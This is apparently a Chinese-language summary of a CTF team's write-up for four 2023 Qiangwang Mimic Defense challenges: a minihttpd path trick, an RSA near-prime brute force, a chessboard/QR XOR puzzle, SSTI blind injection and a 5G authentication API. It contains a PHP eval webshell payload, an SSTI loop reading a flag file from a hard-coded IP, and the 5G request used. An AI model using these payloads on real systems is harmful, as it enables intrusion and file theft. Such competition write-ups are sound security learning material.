---
title: 第六届"强网"拟态防御国际精英挑战赛 WriteUp By Mini-Venom
contest: 强网拟态防御
year: 2023
difficulty: medium
vuln_type: web_unknown
tags: [Web-PHP-remove_path,minihttpd命令注入,Crypto-RSA-next_prime爆破,Misc-二维码国际象棋,Mimic-SSTI盲注,5G-AKA鉴权]
attack_chain: Web-noumisotuitennnoka: minihttpd remove_path特性+create/zip/unzip/clear 4个action,创建/aa子目录+php webshell内容+zip+unzip到/var/www/html+clear删除.htaccess|一眼看出: 给n, c, a(近p,q)→for r in 0..2^6: p=next_prime(a-r), q=next_prime(next_prime(a)+r), if p*q==n: invert+pow|国际象棋与二维码: 500x500 49格棋盘图案 XOR attach.png → 二维码|用户登记系统: SSTI盲注 {{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()[i]}} for i in range(1000)字符逐位|用户鉴权: 5G核心网nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data POST servingNetworkName=admin ausfInstanceId=admin → base64解码
key_payload: ?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//|for r in range(0,2**6): p = gmpy2.next_prime(a-r); q = gmpy2.next_prime(gmpy2.next_prime(a)+r); if(p*q==n): d=gmpy2.invert(65537,(p-1)*(q-1)); m=pow(c,d,n); print(long_to_bytes(m)); break|棋盘 500x500 49格 XOR attach.png|reversed("galf/pmt/")|POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data {servingNetworkName:admin, ausfInstanceId:admin}|flag{621f7c4f-21de-8566-649e-5a883ce318dc}
one_liner: 第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create/zip/unzip/clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴权)
lesson: 1) minihttpd remove_path路径处理:create/zip/unzip/clear四种action加subdir+content+dev(/tmp//); 2) RSA近p爆破:已知近似a,for r in 0..2^6: p=next_prime(a-r),q=next_prime(next_prime(a)+r)验证p*q==n; 3) 棋盘+二维码XOR:生成500x500 49格棋盘图像与attach.png按位XOR得二维码; 4) SSTI字符逐位盲注:`{{c.__init__.__globals__.__builtins__.open("".join(reversed("galf/pmt/"))).read()[i]}}` 1000次循环逐字符读; 5) 5G-AKA鉴权:POST nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data Body JSON servingNetworkName+ausfInstanceId
quality: medium
---

## 备注

原文(https://www.ctfiot.com/146224.html)ChaMd5 Mini-Venom战队WP,开头招新广告(招re/crypto/pwn/misc/合约+IoT+Car+工控+样本分析)。4题。

### 题目详情

**Web-noumisotuitennnoka** — minihttpd命令注入
- 参考:https://blog.tyage.net/archive/p944.html (remove_path的问题)
- 4个action组合:
  - `?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//`
  - `?action=zip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//`
  - `?action=unzip&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//`
  - `?action=clear&subdir=/.htaccess&content=<?php eval($_POST[1]);&dev=/tmp//`
- 访问shell获取webshell

**Crypto-一眼看出** — RSA近p爆破
- n, c给定,a=某数(近p或q)
- for r in 0..2^6(0-64):
  - p = gmpy2.next_prime(a - r)
  - q = gmpy2.next_prime(gmpy2.next_prime(a) + r)
  - if p*q == n: break
- d = gmpy2.invert(65537, (p-1)*(q-1))
- m = pow(c, d, n)
- flag{621f7c4f-21de-8566-649e-5a883ce318dc}

**Misc-国际象棋与二维码**
- 生成500*500像素,行/列为49格的棋盘图案
- 与attach.png按位XOR
- 扫描得flag

**Mimic-用户登记系统** — SSTI字符逐位盲注
```python
url = 'http://116.63.134.105/index.php'
for i in range(1000):
    payload = {'name': '{{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()[' + str(i) + ']}}'}
    response = requests.post(url, data=payload).text[8]
    print(response, end='')
```

**Mimic-用户鉴权** — 5G核心网AKA
- 参考:https://www.sharetechnote.com/html/5G/5G_Core_Authentication.html
- POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data
- Body: `{"servingNetworkName":"admin","ausfInstanceId":"admin"}`
- 响应base64解码

## 评级

- **quality: medium** — 4题exp齐全但都比较简短,Web minihttpd remove_path+next_prime RSA爆破+棋盘XOR+5G-AKA是高价值套路
- **vuln_type: web_unknown** — 多方向混合,主分类Web
- 实战价值:5G核心网AKA鉴权接口暴露是新型CTF考点
